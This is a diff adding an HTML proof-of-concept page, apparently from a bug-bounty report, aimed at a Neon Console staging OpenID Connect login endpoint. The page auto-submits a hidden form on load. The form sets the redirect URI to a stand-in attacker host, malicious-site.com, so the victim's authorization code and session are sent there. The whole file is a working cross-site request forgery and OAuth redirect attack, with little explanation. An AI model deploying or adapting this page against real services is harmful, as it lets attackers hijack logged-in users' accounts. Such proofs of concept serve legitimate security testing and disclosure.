@@ -1,0 +1,16 @@
+<html>
+<body>
+    <h1>CSRF PoC - Neon Console</h1>
+    <p>Jika kamu login di Neon Console, sesi kamu bisa dicuri!</p>
+    <form action="https://console-stage.neon.build/realms/staging-realm/protocol/openid-connect/auth" method="POST">
+        <input type="hidden" name="client_id" value="neon-console">
+        <input type="hidden" name="redirect_uri" value="https://malicious-site.com/callback">
+        <input type="hidden" name="response_type" value="code">
+        <input type="hidden" name="scope" value="openid profile email">
+        <input type="submit" value="Click Here">
+    </form>
+    <script>
+        document.forms[0].submit();
+    </script>
+</body>
+</html>
